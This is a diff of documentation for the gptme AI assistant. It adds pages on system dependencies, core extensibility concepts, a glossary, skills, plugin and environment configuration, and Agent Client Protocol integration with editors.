@@ -26,17 +26,23 @@ See the `README <https://github.com/gptme/gptme/blob/master/README.md>`_ file fo
    :caption: User Guide
 
    getting-started
+   system-dependencies
    usage
+   concepts
+   glossary
    examples
    tools
    lessons
+   skills/README
    config
    providers
-   custom-providers
    agents
    server
    mcp
+   acp
+   commands
    cli
+   security
 
 .. toctree::
    :maxdepth: 2
@@ -50,7 +56,7 @@ See the `README <https://github.com/gptme/gptme/blob/master/README.md>`_ file fo
    finetuning
    custom_tool
    hooks
-   misc/server-hooks-analysis
+   plugins
    api
 
 .. toctree::
@@ -108,6 +114,11 @@ If ``uv`` is not installed, you can install it using pip, pipx, or your system p
 .. note::
 
    Windows is not directly supported, but you can run gptme using WSL or Docker.
+
+.. tip::
+
+   Some gptme tools require additional system dependencies (playwright, tmux, gh, etc.).
+   See :doc:`system-dependencies` for details.
 
 Usage
 -----
@@ -168,6 +179,74 @@ Support
 For any issues, please visit our `issue tracker <https://github.com/gptme/gptme/issues>`_.
 
 
+System Dependencies
+===================
+
+Some gptme features require additional non-Python dependencies. These are optional and only needed for specific tools.
+
+Optional Dependencies
+---------------------
+
+.. list-table::
+   :header-rows: 1
+   :widths: 20 40 40
+
+   * - Dependency
+     - Purpose
+     - Installation
+   * - ``playwright``
+     - Browser automation for the browser tool
+     - ``pipx inject gptme playwright && playwright install``
+   * - ``lynx``
+     - Text-based web browser (alternative to playwright)
+     - ``apt install lynx`` (Debian/Ubuntu) or ``brew install lynx`` (macOS)
+   * - ``tmux``
+     - Terminal multiplexer for long-running commands
+     - ``apt install tmux`` (Debian/Ubuntu) or ``brew install tmux`` (macOS)
+   * - ``gh``
+     - GitHub CLI for the gh tool
+     - See `GitHub CLI installation <https://cli.github.com/>`_
+   * - ``wl-clipboard``
+     - Wayland clipboard support
+     - ``apt install wl-clipboard`` (Debian/Ubuntu)
+   * - ``pdftotext``
+     - PDF text extraction
+     - ``apt install poppler-utils`` (Debian/Ubuntu) or ``brew install poppler`` (macOS)
+
+Details
+-------
+
+playwright
+~~~~~~~~~~
+
+The ``playwright`` library enables browser automation capabilities. After installing with ``pipx inject gptme playwright``, run ``playwright install`` to download the required browser binaries.
+
+lynx
+~~~~
+
+An alternative to playwright for web browsing. Uses less resources and works in text mode, but has limited JavaScript support.
+
+tmux
+~~~~
+
+Required for the tmux tool which enables running long-running or interactive commands in persistent terminal sessions.
+
+gh (GitHub CLI)
+~~~~~~~~~~~~~~~
+
+The GitHub CLI is needed for the gh tool to interact with GitHub repositories, issues, and pull requests. Installation instructions vary by platform - see the `official documentation <https://cli.github.com/>`_.
+
+wl-clipboard
+~~~~~~~~~~~~
+
+Needed for clipboard operations on Wayland-based Linux systems. Not required on X11 systems or other platforms.
+
+pdftotext
+~~~~~~~~~
+
+Part of the poppler utilities, used for extracting text from PDF files. Install the ``poppler-utils`` package on Debian/Ubuntu or ``poppler`` on macOS.
+
+
 Usage
 =====
 
@@ -188,22 +267,22 @@ To get inspiration for your first prompt, see the :doc:`examples`.
    :local:
    :backlinks: none
 
+.. _usage-commands:
+
 Commands
 --------
 
-.. TODO: use autodoc from source, like cli reference
+gptme provides slash-commands for various actions within the chat.
+For the complete reference, see :doc:`commands`.
 
-You can use these slash-commands for various actions within the chat:
+Common commands:
 
-- ``/undo`` - Undo the last action
+- ``/help`` - Show available commands
+- ``/undo [n]`` - Undo the last n actions
 - ``/log`` - Show the conversation log
-- ``/tools`` - Show available tools
 - ``/edit`` - Edit the conversation in your editor
-- ``/rename`` - Rename the conversation
-- ``/fork`` - Create a copy of the conversation
-- ``/summarize`` - Summarize the conversation
-- ``/replay`` - Re-execute codeblocks in the conversation
-- ``/help`` - Show help message
+- ``/model`` - List or switch models
+- ``/tokens`` - Show token usage and costs
 - ``/exit`` - Exit the program
 
 Interfaces
@@ -369,6 +448,539 @@ Example workflow:
 -----
 
 For further usage examples, see the :doc:`examples` page.
+
+
+Core Concepts
+=============
+
+gptme's architecture is built around five core extensibility mechanisms that work together to create a powerful AI assistant platform. Understanding how these concepts relate helps you extend gptme effectively and choose the right approach for your needs.
+
+Architecture Overview
+---------------------
+
+.. mermaid::
+
+   graph TD
+       K[Knowledge Files] --> A[AI Assistant]
+       T[Tools] --> A
+       H[Hooks] --> T
+       C[Commands] --> A
+       P[Plugins] --> T
+       P --> H
+       P --> C
+       A --> U[User]
+
+The five core concepts:
+
+1. **Knowledge Files** - Context and instructions (via :doc:`skills/README`)
+2. **Tools** - Capabilities the AI can use (see :doc:`tools`)
+3. **Hooks** - Lifecycle integration points (see :doc:`hooks`)
+4. **Commands** - User interface shortcuts (see :ref:`usage-commands`)
+5. **Plugins** - Packaging mechanism for tools/hooks/commands (see :doc:`plugins`)
+
+Knowledge Files (Context Injection)
+------------------------------------
+
+**What**: Lightweight knowledge bundles that inject context into conversations.
+
+**Purpose**: Share knowledge, workflows, examples, and best practices with the AI without modifying code.
+
+**Format**: Anthropic's skill format - YAML frontmatter + markdown content
+
+**Structure**:
+
+.. code-block:: text
+
+   my-skill/
+   ├── SKILL.md          # Main content with YAML frontmatter
+   ├── resources/        # Reference materials (optional)
+   ├── scripts/          # Utility scripts (optional)
+   └── templates/        # Markdown templates (optional)
+
+**Example**:
+
+.. code-block:: markdown
+
+   ---
+   name: Python Best Practices
+   description: Coding standards for Python projects
+   ---
+
+   # Python Best Practices
+
+   When writing Python code:
+   - Use type hints
+   - Follow PEP 8
+   - Write docstrings
+
+   Example:
+   ```python
+   def greet(name: str) -> str:
+       """Greet a person by name."""
+       return f"Hello, {name}!"
+   ```
+
+**When to use**:
+
+- Sharing knowledge and best practices
+- Providing examples and templates
+- Guiding workflow and decision-making
+- No runtime behavior needed
+
+**Distribution**: ZIP archives, shared via directories
+
+See :doc:`skills/README` for complete documentation.
+
+Tools (Capabilities)
+--------------------
+
+**What**: Functions the AI can execute to interact with the system.
+
+**Purpose**: Extend what the AI can *do* - execute code, read files, browse web, etc.
+
+**Structure**: Python functions with ``ToolSpec`` metadata
+
+**Example**:
+
+.. code-block:: python
+
+   from gptme.tools.base import ToolSpec
+
+   def analyze_code(path: str) -> str:
+       """Analyze code quality and suggest improvements."""
+       # Implementation
+       return "Analysis results..."
+
+   analyze_tool = ToolSpec(
+       name="analyze",
+       desc="Analyze code quality",
+       instructions="Use this to check code quality.",
+       functions=[analyze_code],
+   )
+
+**When to use**:
+
+- Adding new capabilities (data processing, API calls, etc.)
+- Integrating external services
+- Providing domain-specific functionality
+- Need the AI to *execute* something
+
+**Types of tools**:
+
+- **Built-in**: Included with gptme (see :doc:`tools`)
+- **Custom**: User-created (see :doc:`custom_tool`)
+- **Plugin**: Distributed as packages (see :doc:`plugins`)
+
+Hooks (Lifecycle Integration)
+------------------------------
+
+**What**: Callbacks that execute at specific points in gptme's lifecycle.
+
+**Purpose**: Intercept and modify gptme's behavior at runtime - validate inputs, transform outputs, manage state, etc.
+
+**Hook Types**:
+
+- **Message hooks**: ``PRE_PROCESS``, ``POST_PROCESS``, ``TRANSFORM``
+- **Tool hooks**: ``PRE_EXECUTE``, ``POST_EXECUTE``, ``TRANSFORM``
+- **File hooks**: ``PRE_SAVE``, ``POST_SAVE``, ``PRE_PATCH``, ``POST_PATCH``
+- **Session hooks**: ``START``, ``END``
+- **Generation hooks**: ``PRE``, ``POST``, ``INTERRUPT``
+
+**Example**:
+
+.. code-block:: python
+
+   from gptme.hooks import HookType, register_hook
+
+   def lint_before_save(path: str, content: str) -> str:
+       """Run linter on code before saving."""
+       if path.endswith('.py'):
+           # Run linting logic
+           return content  # TODO: implement linting logic
+       return content
+
+   register_hook(HookType.FILE_PRE_SAVE, lint_before_save)
+
+**When to use**:
+
+- Validating or transforming inputs/outputs
+- Adding automatic checks (linting, testing, etc.)
+- Managing state or side effects
+- Implementing cross-cutting concerns
+- Need to *modify* gptme's behavior
+
+**Note**: Hooks are powerful but complex - only use when tools aren't sufficient.
+
+See :doc:`hooks` for complete documentation.
+
+Commands (User Interface)
+-------------------------
+
+**What**: Shortcuts for common operations that users type directly.
+
+**Purpose**: Provide convenient interface for frequent actions.
+
+.. _commands:
+
+**Built-in commands**:
+
+- ``/undo`` - Undo last action
+- ``/log`` - Show conversation history
+- ``/tokens`` - Display token usage
+- ``/context`` - Show/modify context files
+
+**Custom commands** (via plugins):
+
+.. code-block:: python
+
+   from gptme.commands import register_command
+
+   def status_command():
+       """Show project status."""
+       # Implementation
+       return "Status: All systems operational"
+
+   register_command("status", status_command)
+
+**When to use**:
+
+- Frequent operations need shortcuts
+- User needs direct control
+- Complement tool functionality
+- Need fast access to information
+
+**Distribution**: Defined in plugins (see :doc:`plugins`)
+
+Plugins (Packaging Mechanism)
+------------------------------
+
+**What**: Python packages that bundle tools, hooks, and commands together.
+
+**Purpose**: Distribute complete functionality as installable packages.
+
+**Structure**:
+
+.. code-block:: text
+
+   my_plugin/
+   ├── __init__.py          # Plugin metadata
+   ├── tools/               # Tool implementations
+   │   ├── __init__.py
+   │   └── my_tool.py
+   ├── hooks/               # Hook implementations
+   │   ├── __init__.py
+   │   └── my_hook.py
+   └── commands/            # Command implementations
+       ├── __init__.py
+       └── my_command.py
+
+**When to use**:
+
+- Bundling related tools/hooks/commands
+- Creating reusable functionality
+- Distributing to others
+- Need deep integration with gptme runtime
+
+**Examples**:
+
+- `consortium <https://github.com/gptme/gptme-contrib/tree/master/plugins/consortium>`_ - AI collaboration tools
+- `imagen <https://github.com/gptme/gptme-contrib/tree/master/plugins/imagen>`_ - Image generation
+- `example-hooks <https://github.com/gptme/gptme-contrib/tree/master/plugins/example-hooks>`_ - Hook system demonstrations
+
+See :doc:`plugins` for complete documentation.
+
+How They Work Together
+-----------------------
+
+These concepts complement each other to create a flexible extensibility system:
+
+**Example: Code Quality System**
+
+1. **Knowledge File** (skill): Best practices and coding standards
+
+   .. code-block:: markdown
+
+      # Code Quality Standards
+      Always run linting before committing code.
+
+2. **Tool**: Execute linter
+
+   .. code-block:: python
+
+      def lint(path: str) -> str:
+          """Run linter on code."""
+          # Implementation
+
+3. **Hook**: Automatic linting on save
+
+   .. code-block:: python
+
+      register_hook(HookType.FILE_PRE_SAVE, auto_lint)
+
+4. **Command**: Manual lint trigger
+
+   .. code-block:: python
+
+      register_command("lint", lint_command)
+
+5. **Plugin**: Package it all together
+
+   .. code-block:: text
+
+      linting_plugin/
+      ├── tools/lint.py     # Linting tool
+      ├── hooks/auto.py     # Auto-lint hook
+      └── commands/lint.py  # Lint command
+
+**Result**: Complete code quality system that:
+
+- Guides with knowledge (what standards to follow)
+- Provides capability (can run linter)
+- Integrates automatically (lint on save)
+- Offers manual control (lint command)
+- Distributes as package (plugin)
+
+Decision Guide
+--------------
+
+**When to use each mechanism**:
+
+.. list-table::
+   :header-rows: 1
+   :widths: 20 40 40
+
+   * - Mechanism
+     - Use When
+     - Don't Use When
+   * - **Knowledge Files**
+     - • Sharing information
+
+       • Providing examples
+
+       • Guiding decisions
+
+       • No runtime behavior needed
+     - • Need to execute code
+
+       • Need to modify gptme behavior
+
+       • Require dynamic behavior
+   * - **Tools**
+     - • Adding capabilities
+
+       • Executing actions
+
+       • Integrating services
+
+       • AI needs to do something
+     - • Just sharing knowledge
+
+       • Need to modify gptme's behavior
+
+       • User shortcuts only
+   * - **Hooks**
+     - • Validating inputs/outputs
+
+       • Automatic checks
+
+       • Cross-cutting concerns
+
+       • Modifying behavior
+     - • Can solve with tools
+
+       • Don't need lifecycle integration
+
+       • Just adding capabilities
+   * - **Commands**
+     - • User shortcuts needed
+
+       • Direct control required
+
+       • Frequent operations
+
+       • Fast access to info
+     - • AI should decide when to use
+
+       • Complex operations better as tools
+
+       • Rarely used functionality
+   * - **Plugins**
+     - • Bundling related functionality
+
+       • Distributing to others
+
+       • Deep integration needed
+
+       • Professional distribution
+     - • Single simple tool
+
+       • Personal use only
+
+       • Quick experimentation
+
+Progressive Enhancement
+-----------------------
+
+Start simple and add complexity as needed:
+
+1. **Level 1**: Knowledge Files
+
+   - Share knowledge and workflows
+   - No code required
+   - Portable and simple
+
+2. **Level 2**: Custom Tools
+
+   - Add new capabilities
+   - Single Python file
+   - Local use
+
+3. **Level 3**: Hooks (if needed)
+
+   - Modify behavior
+   - Lifecycle integration
+   - More complex
+
+4. **Level 4**: Complete Plugin
+
+   - Bundle everything
+   - Professional distribution
+   - Full integration
+
+**Example progression**:
+
+.. code-block:: text
+
+   Level 1: deployment-workflow.md (knowledge)
+           ↓
+   Level 2: deploy.py (custom tool)
+           ↓
+   Level 3: pre_deploy_check.py (hook)
+           ↓
+   Level 4: deployment_plugin/ (plugin)
+
+Best Practices
+--------------
+
+**Do**:
+
+- ✅ Start with knowledge files (simplest)
+- ✅ Use tools for capabilities
+- ✅ Add hooks only when necessary
+- ✅ Provide commands for common actions
+- ✅ Bundle as plugin for distribution
+- ✅ Follow single responsibility principle
+
+**Don't**:
+
+- ❌ Mix concerns (knowledge vs. runtime)
+- ❌ Use hooks when tools would work
+- ❌ Create plugins for single tools
+- ❌ Over-engineer solutions
+- ❌ Ignore existing mechanisms
+
+Further Reading
+---------------
+
+- :doc:`skills/README` - Knowledge files and skill format
+- :doc:`tools` - Built-in tools catalog
+- :doc:`custom_tool` - Creating custom tools
+- :doc:`hooks` - Hook system details
+- :doc:`plugins` - Plugin development guide
+- :doc:`examples` - Real-world usage examples
+
+Summary
+-------
+
+**The five core concepts work together**:
+
+- **Knowledge Files** provide context and guidance (what to think)
+- **Tools** provide capabilities (what AI can do)
+- **Hooks** modify behavior (how gptme operates)
+- **Commands** offer shortcuts (what users can trigger)
+- **Plugins** package functionality (how to distribute)
+
+Choose the right level of complexity for your needs, and progressively enhance as requirements grow.
+
+
+# Glossary
+
+This document defines key terminology used throughout the gptme codebase.
+
+## Conversational Concepts
+
+(turn)=
+### Turn
+A complete conversational exchange between the user and the assistant.
+
+A turn consists of:
+1. A user message (input)
+2. All assistant responses and tool executions until no more tools are runnable
+3. Any system messages generated during processing
+
+In the context of LLMs, "turns" denote the explicit conversational exchanges between a user and the model. A single turn may contain multiple [steps](#step).
+
+**Code reference**: The `_process_user_msg()` function in `gptme/chat.py` processes a complete turn.
+
+(step)=
+### Step
+A single cycle of LLM generation and tool execution within a turn.
+
+A step consists of:
+1. Pre-process hooks execution
+2. LLM response generation
+3. Tool execution (if tools are present in the response)
+
+In the context of LLMs, "steps" generally refer to an internal reasoning process or a sequence of actions an agent takes to solve a problem. Multiple steps may occur within a single [turn](#turn).
+
+**Code reference**: The `step()` function in `gptme/chat.py` performs one step.
+
+### Message Processing
+The complete handling of a user message, including all steps until no more tools need to run.
+
+**Hooks behavior**:
+- `MESSAGE_PRE_PROCESS`: Fires before each [step](#step)
+- `MESSAGE_POST_PROCESS`: Fires once after all steps complete (i.e., once per [turn](#turn))
+
+For the complete list of hook types and their lifecycle, see the [Hooks documentation](hooks.rst).
+
+## Context and Memory
+
+### Context Window
+The maximum number of tokens a model can process in a single request. This includes all messages, tool definitions, and system prompts.
+
+### Prompt Cache
+A mechanism to cache and reuse previously processed context, reducing token costs for repeated prefixes. Cache invalidation occurs when the cached portion changes.
+
+### Token
+A unit of text processed by the model. Tokens are typically sub-word units (e.g., "unhappy" → "un" + "happy").
+
+## Tool Concepts
+
+### Tool
+A function that the assistant can execute to perform actions like reading files, running commands, or making API calls.
+
+### ToolUse
+A parsed representation of a tool invocation found in an assistant's response.
+
+### Runnable Tool
+A tool that can be executed in the current context. Some tools may be defined but not runnable (e.g., disabled or context-restricted).
+
+## Session Concepts
+
+### Log / LogManager
+The conversation history and its management system. Stores all messages exchanged in a session.
+
+### Workspace
+The directory context in which gptme operates. Tools like file operations are scoped to the workspace.
+
+## Configuration
+
+### Model
+The LLM backend used for generation (e.g., `openai/gpt-4`, `anthropic/claude-3`).
+
+### Tool Format
+How tools are presented to the model: `"markdown"` (tool blocks in markdown) or `"tool"` (native function calling).
 
 
 Examples
@@ -1276,6 +1888,225 @@ See Also
 - :doc:`agents` - Using lessons with AI agents
 
 
+# Skills System
+
+> **Note**: Skills are **lightweight knowledge bundles** using Anthropic's folder-style format. The core of it builds on gptme's native [lessons](../lessons.rst) system. For deep runtime integration (hooks, custom tools, commands), use [plugins](../plugins.rst) instead.
+
+The skills system extends gptme's lesson system to support bundled tools, scripts, and workflows inspired by Claude's Skills system and Cursor's rules system.
+
+## Overview
+
+**Skills** are enhanced lessons that bundle:
+- Instructional content (like lessons)
+- Executable scripts and utilities
+- Dependencies and setup requirements
+
+Skills complement lessons by providing **executable components** alongside guidance.
+
+## Skill vs. Lesson vs. Plugin
+
+| Feature | Lesson | Skill | Plugin |
+|---------|--------|-------|--------|
+| Purpose | Guidance and patterns | Executable workflows | Deep runtime integration |
+| Content | Instructions, examples | Instructions + scripts | Tools, hooks, commands |
+| Scripts | None | Bundled helper scripts | Via custom tools |
+| Dependencies | None | Explicit package requirements | Python package dependencies |
+| Hooks | No | No | Yes |
+| Custom Tools | No | No | Yes |
+| Format | Markdown | Anthropic YAML | Python package |
+
+**When to use**:
+- **Lesson**: Teaching patterns, best practices, tool usage
+- **Skill**: Providing reusable scripts, automated workflows (lightweight)
+- **Plugin**: Runtime hooks, custom tools, deep gptme integration (see [plugins](../plugins.rst))
+
+## Skill Format
+
+
+Skills use YAML frontmatter following Anthropic's format:
+
+```yaml
+---
+name: skill-name
+description: Brief description of what the skill does and when to use it
+---
+
+# Skill Title
+
+Skill description and usage instructions...
+```
+
+**Note**: Dependencies are specified in `requirements.txt`, and bundled scripts are placed in the same directory as `SKILL.md`.
+
+Skill description and usage instructions...
+```
+
+## Directory Structure
+
+Skills are organized parallel to lessons:
+
+gptme/
+└── lessons/           # Unified knowledge tree
+    ├── tools/        # Tool-specific lessons
+    ├── patterns/     # General patterns
+    ├── workflows/    # Workflow lessons
+    └── skills/       # Skills (Anthropic format)
+        └── python-repl/
+            ├── SKILL.md
+            ├── python_helpers.py
+            └── requirements.txt
+
+## Creating Skills
+
+### 1. Design the Skill
+
+Identify:
+- What workflow or automation does it provide?
+- What scripts/utilities are needed?
+- What dependencies are required?
+
+### 2. Create Skill Directory
+
+Create a directory under `gptme/lessons/skills/skill-name/` with these files:
+
+**SKILL.md** (Anthropic format):
+```yaml
+---
+name: skill-name
+description: Brief description of what the skill does
+---
+
+# Skill Title
+
+## Overview
+Detailed description and use cases.
+
+## Bundled Scripts
+Describe each included script.
+
+## Usage Patterns
+Show common usage examples.
+
+## Dependencies
+List required packages (detailed in requirements.txt).
+```
+
+**requirements.txt**:
+
+```text
+# List of required packages
+numpy
+pandas
+```
+
+### 3. Create Bundled Scripts
+
+Create helper scripts in the same directory as the skill:
+
+```python
+#!/usr/bin/env python3
+"""Helper script for skill."""
+
+def helper_function():
+    """Does something useful."""
+    pass
+```
+
+### 4. Test the Skill
+
+```python
+from gptme.lessons.parser import parse_lesson
+from pathlib import Path
+
+# Parse skill from unified lessons tree
+skill = parse_lesson(Path("gptme/lessons/skills/my-skill/SKILL.md"))
+assert skill.metadata.name == "my-skill"
+assert skill.metadata.description
+```
+
+
+### Deep Integration with Plugins
+
+**For runtime integration (hooks, custom tools, commands), use the [Plugin System](../plugins.rst).**
+
+Skills are lightweight knowledge bundles that remain simple. For deeper integration with gptme's runtime:
+
+- **Hooks**: Register lifecycle callbacks (see [Hooks Documentation](../hooks.rst))
+- **Custom Tools**: Add new capabilities (see {ref}`creating-a-plugin`)
+- **Commands**: Add CLI commands (see {ref}`plugin-command-modules`)
+
+**Example**: For a skill that needs hooks, create a plugin instead:
+
+```python
+# In a plugin: my_plugin/hooks/setup.py
+from gptme.hooks import HookType, register_hook
+
+def setup_environment(logdir, workspace, initial_msgs):
+    """Initialize environment at session start."""
+    # Your hook logic here
+    yield
+
+def register():
+    register_hook("my_plugin.setup", HookType.SESSION_START, setup_environment)
+```
+
+See [Plugin System Documentation](../plugins.rst) for complete examples.
+
+## Use Cases
+
+### Data Analysis Skill
+- Bundles pandas, numpy helpers
+- Auto-imports common libraries
+- Provides data inspection utilities
+- Includes plotting helpers
+
+### Testing Skill
+- Bundles pytest configuration
+- Provides test utilities
+- Auto-discovers tests
+- Formats test reports
+
+### API Development Skill
+- Bundles FastAPI templates
+- Provides auth helpers
+- Includes validation utilities
+- Auto-generates OpenAPI docs
+
+## Integration with Lessons
+
+Skills complement lessons:
+- **Lesson teaches** the pattern
+- **Skill provides** the tooling
+
+Example:
+- Lesson: `lessons/patterns/testing.md` - Testing best practices
+- Skill: `skills/testing-skill.md` - Bundled pytest utilities
+
+## Roadmap
+
+### Current Status (Phase 4.1)
+- ✅ Parser support for skills metadata
+- ✅ Example skill with bundled scripts
+- ✅ Documentation
+- ✅ Hook system (available in [plugins](../plugins.rst), not skills)
+
+### Future Work (Phase 4.2+)
+- [ ] Dependency management for skills
+- [ ] Script bundling and loading for skills
+- [ ] Skills CLI commands
+- [ ] Skills discovery and listing
+
+**Note**: For runtime integration (hooks, custom tools, commands), see [Plugin System](../plugins.rst). Skills remain lightweight knowledge bundles.
+
+## Related
+
+- [Lesson System](../lessons) - Core knowledge system
+- [Plugin System](../plugins.rst) - For hooks, custom tools, and deep integration
+- [Hooks Documentation](../hooks.rst) - Lifecycle callbacks (plugins only)
+- [Issue #686](https://github.com/gptme/gptme/issues/686) - Phase 4: Skills Integration
+- [Claude Skills](https://simonwillison.net/2025/Oct/10/claude-skills/) - Inspiration
+
+
 Configuration
 =============
 
@@ -1361,7 +2192,22 @@ This file currently supports a few options:
 - ``prompt``, a string that will be included in the system prompt with a ``# Current Project`` header.
 - ``base_prompt``, a string that will be used as the base prompt for the project. This will override the global base prompt ("You are gptme v{__version__}, a general-purpose AI assistant powered by LLMs. [...]"). It can be useful to change the identity of the assistant and override some default behaviors.
 - ``context_cmd``, a command used to generate context to include when constructing the system prompt. The command will be run in the workspace root and should output a string that will be included in the system prompt. Examples can be ``git status -v`` or ``scripts/context.sh``.
+
+  .. warning::
+
+     The command is executed with shell interpretation. Review ``gptme.toml`` before running gptme in untrusted repositories. See :doc:`security` for details.
+
 - ``rag``, a dictionary to configure the RAG tool. See :ref:`rag` for more information.
+- ``plugins``, a dictionary to configure plugins for this project. See :doc:`plugins` for more information. Example:
+
+  .. code-block:: toml
+
+      [plugins]
+      paths = ["./plugins", "~/.config/gptme/plugins"]
+      enabled = ["my_project_plugin"]
+
+- ``env``, a dictionary of environment variables to set for this project. These take precedence over global config but are overridden by shell environment variables.
+- ``mcp``, MCP server configuration for this project. See :ref:`mcp` for more information.
 
 See :class:`gptme.config.ProjectConfig` for the API reference.
 
@@ -1391,9 +2237,13 @@ Besides the configuration files, gptme supports several environment variables to
 - ``GPTME_CHAT_HISTORY`` - Enable cross-conversation context (default: false)
 - ``GPTME_COSTS`` - Enable cost reporting for API calls (default: false)
 - ``GPTME_FRESH`` - Enable fresh context mode (default: false)
-- ``GPTME_BREAK_ON_TOOLUSE`` - Interrupt generation when tool use occurs in stream (default: true)
+- ``GPTME_BREAK_ON_TOOLUSE`` - Interrupt generation when tool use occurs in stream (default: true). Set to ``0`` to allow multiple tool calls per LLM response (equivalent to ``--multi-tool`` flag).
 - ``GPTME_PATCH_RECOVERY`` - Return file content in error for non-matching patches (default: false)
 - ``GPTME_SUGGEST_LLM`` - Enable LLM-powered prompt completion (default: false)
+
+.. rubric:: Deprecated Environment Variables
+
+- ``GPTME_TOOLUSE_PARALLEL`` - **DEPRECATED**: Previously enabled parallel thread execution of tool calls, but caused thread-safety issues with prompt_toolkit. Use ``GPTME_BREAK_ON_TOOLUSE=0`` instead for multi-tool mode with sequential execution.
 
 .. rubric:: API Configuration
 
@@ -1402,6 +2252,7 @@ Besides the configuration files, gptme supports several environment variables to
 .. rubric:: Tool Configuration
 
 - ``GPTME_TTS_VOICE`` - Set the voice to use for TTS
+- ``GPTME_TTS_SPEED`` - Set the speed to use for TTS (default: 1.0)
 - ``GPTME_VOICE_FINISH`` - Wait for TTS speech to finish before exiting (default: false)
 
 .. rubric:: Paths
@@ -1437,7 +2288,16 @@ Providers
 
 We support LLMs from several providers, including OpenAI, Anthropic, OpenRouter, Deepseek, Azure, and any OpenAI-compatible server (e.g. ``ollama``, ``llama-cpp-python``).
 
+.. note::
+
+    We are in the process of adding support for configurable `custom providers <custom-providers>`_.
+
 You can find our model recommendations on the :doc:`evals` page.
+
+.. toctree::
+   :maxdepth: 2
+
+   custom-providers
 
 To select a provider and model, run ``gptme`` with the ``-m``/``--model`` flag set to ``<provider>/<model>``, for example:
 
@@ -1483,11 +2343,9 @@ To achieve that with ``ollama``, install it then run:
     Small models won't work well with tools, severely limiting the usefulness of gptme. You can find an overview of how different models perform on the :doc:`evals` page.
 
 
-# Custom OpenAI-Compatible Providers
+# Custom Providers
 
-**Status**: Phase 1 Implementation (Configuration & Loading)
-
-As of Phase 1, gptme supports configuring multiple custom OpenAI-compatible providers in addition to the built-in providers (openai, azure, openrouter, etc.).
+gptme supports configuring multiple custom OpenAI-compatible providers (completions API) in addition to the built-in providers (openai, openrouter, etc.).
 
 ## Configuration
 
@@ -1797,14 +2655,34 @@ Usage
 
 **Installing dependencies:**
 
-First install the required dependencies using `pipx <https://pipx.pypa.io/>`_ (recommended) to ensure isolation and easy management:
+First install the required dependencies and then gptme itself using `pipx <https://pipx.pypa.io/>`_ (recommended) to ensure isolation and easy management:
 
 .. code-block:: bash
 
-    # Install required dependencies
-    pipx install gptme   # or `pipx install -e ./gptme` to install from local source
+    # Install pipx and other system dependencies
+    sudo apt install pipx tree
+    # or `brew install pipx tree`
+
+    # Install common dev dependencies (recommended)
+    sudo apt install git curl make build-essential \
+        python3 python3-dev python-is-python3
+
+    # Install gptme itself
+    pipx install gptme
+    # or `pipx install -e ./gptme` to install from local source
+    # or `pipx install "git+https://github.com/gptme/gptme.git@master#egg=gptme[browser,server,telemetry]"`_ for latest master with extras
+
+    # Requirements for agent
     pipx install uv
     pipx install pre-commit
+
+    # Install optional dependencies
+    sudo apt install lynx shellcheck jq pandoc ripgrep
+    # or `brew install lynx shellcheck jq pandoc ripgrep`
+
+    # Recommended:
+    # Install latest `gh` GitHub CLI from GitHub source (not old package manager version)
+    # See https://cli.github.com/
 
 **Creating an Agent:**
 
@@ -2250,6 +3128,640 @@ gptme provides CLI commands to manage and test your MCP servers:
 These commands help you verify that your MCP servers are properly configured and accessible.
 
 
+.. _acp:
+
+ACP (Agent Client Protocol)
+===========================
+
+gptme implements the `Agent Client Protocol (ACP) <https://github.com/ArcadeAI/agent-client-protocol>`_, allowing it to be used as a coding agent from any ACP-compatible editor such as `Zed <https://zed.dev/>`_ and JetBrains IDEs.
+
+This enables a seamless integration where your editor can leverage gptme's powerful toolset (code execution, file editing, web browsing, etc.) directly within your development workflow.
+
+.. note::
+   ACP support is currently in development. Phase 1 (basic integration) is complete.
+   Future phases will add tool call reporting, session persistence, and enhanced features.
+
+Installation
+------------
+
+To use gptme as an ACP agent, install with the ``acp`` extra:
+
+.. code-block:: bash
+
+    pipx install 'gptme[acp]'
+
+Or with pip:
+
+.. code-block:: bash
+
+    pip install 'gptme[acp]'
+
+Usage
+-----
+
+Running the Agent
+~~~~~~~~~~~~~~~~~
+
+Start the gptme ACP agent:
+
+.. code-block:: bash
+
+    # Via module
+    python -m gptme.acp
+
+The agent communicates via stdio using the ACP protocol, making it compatible with any ACP client.
+
+Editor Integration
+~~~~~~~~~~~~~~~~~~
+
+**Zed Editor**
+
+Zed has native ACP support. To use gptme as your coding agent:
+
+1. Install gptme with ACP support
+2. Configure Zed to use gptme as the agent command
+3. The agent will be available in Zed's agent panel
+
+**JetBrains IDEs**
+
+JetBrains IDEs with ACP plugin support can integrate with gptme similarly. Configure the plugin to use ``python -m gptme.acp`` as the agent command.
+
+Architecture
+------------
+
+The ACP implementation in gptme consists of:
+
+**GptmeAgent**
+    The main agent class implementing the ACP interface. It:
+
+    - Handles ``initialize`` to set up the gptme environment
+    - Creates sessions via ``new_session`` with proper logging
+    - Processes prompts through gptme's chat infrastructure
+    - Streams responses back to the client
+
+**Session Management**
+    Each ACP session maps to a gptme conversation with:
+
+    - Isolated log directory
+    - Working directory context
+    - Full tool access (code execution, file editing, etc.)
+
+Protocol Methods
+----------------
+
+The agent implements the following ACP methods:
+
+**initialize**
+    Negotiates protocol version and initializes gptme. Called once when a client connects.
+
+**new_session**
+    Creates a new gptme session with:
+
+    - Unique session ID
+    - Working directory context
+    - Initial system prompts and tool configuration
+
+**prompt**
+    Handles user prompts by:
+
+    1. Converting ACP content to gptme messages
+    2. Running through gptme's chat step
+    3. Streaming responses via ``session/update``
+    4. Returning completion status
+
+Configuration
+-------------
+
+The ACP agent uses gptme's standard configuration. You can customize:
+
+- **Model**: Set via ``GPTME_MODEL`` environment variable or config
+- **Tools**: All gptme tools are available by default
+- **Working Directory**: Inherited from the ``new_session`` request
+
+Example configuration in ``~/.config/gptme/config.toml``:
+
+.. code-block:: toml
+
+    [general]
+    model = "anthropic/claude-sonnet-4-20250514"
+
+    [tools]
+    # Tools are auto-confirmed in ACP mode
+    # Configure allowlist if needed
+    allowlist = ["python", "shell", "patch", "save"]
+
+Capabilities
+------------
+
+Through ACP, gptme provides:
+
+- **Code Execution**: Run Python and shell commands
+- **File Operations**: Read, write, and patch files
+- **Web Browsing**: Search and read web pages
+- **Context Awareness**: Workspace and project understanding
+- **Conversation Memory**: Persistent session history
+
+Development Roadmap
+-------------------
+
+**Phase 1: Basic Integration** ✅ Complete
+
+    - Agent initialization and session creation
+    - Prompt handling with response streaming
+    - Full tool access through gptme
+
+**Phase 2: Tool Call Reporting** 🚧 In Progress
+
+    - Report tool executions to client
+    - Permission request workflow
+    - Status lifecycle tracking
+
+**Phase 3: Session Persistence** 🚧 In Progress
+
+    - Save and restore sessions
+    - Cancellation support
